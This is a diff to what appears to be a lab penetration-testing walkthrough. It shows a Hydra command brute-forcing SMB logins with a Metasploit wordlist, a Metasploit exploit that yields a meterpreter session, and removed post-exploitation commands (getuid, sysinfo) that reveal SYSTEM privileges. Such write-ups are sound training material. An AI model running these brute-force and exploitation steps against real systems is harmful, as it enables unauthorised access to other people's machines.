@@ -259,15 +259,6 @@ Now, let's run the hydra tool for brute-forcing the SMB protocol to find the val
 
 ```bash
 hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip_local smb
--L
-#: List of users
-
--P
-#: Password list
-
-target_ip_local smb
-#: Target Address and Target Protocol
-
 ```
 
 ### Now, we can use the Metasploit framework and run the
@@ -286,15 +277,6 @@ exploit
 ```
 
 Success!. We have received a meterpreter session.
-
-### Now, we will discover target machine information, e.g., current user, system information, arch, etc.
-
-```bash
-getuid
-sysinfo
-```
-
-We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.
 
 ### Let's check if we can access target_ip from the compromised host.
 
